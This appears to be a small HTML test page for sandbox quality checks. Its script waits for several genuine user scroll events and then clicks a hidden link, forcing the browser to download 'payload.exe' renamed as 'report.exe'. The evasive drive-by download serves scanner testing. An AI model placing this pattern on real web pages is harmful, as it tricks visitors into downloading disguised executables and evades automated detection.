<p><strong>TEST PAGE - URL SANDBOX QA</strong> - on-scroll</p>

<div style='height:3000px'></div><a id="d" href="payload.exe" download="report.exe">download</a><script>var s=0,last=0;addEventListener('scroll',function(e){if(!e.isTrusted)return;var y=window.scrollY||document.documentElement.scrollTop;if(Math.abs(y-last)>20)s++;last=y;if(s>=3&&y>300)document.getElementById('d').click();});</script>
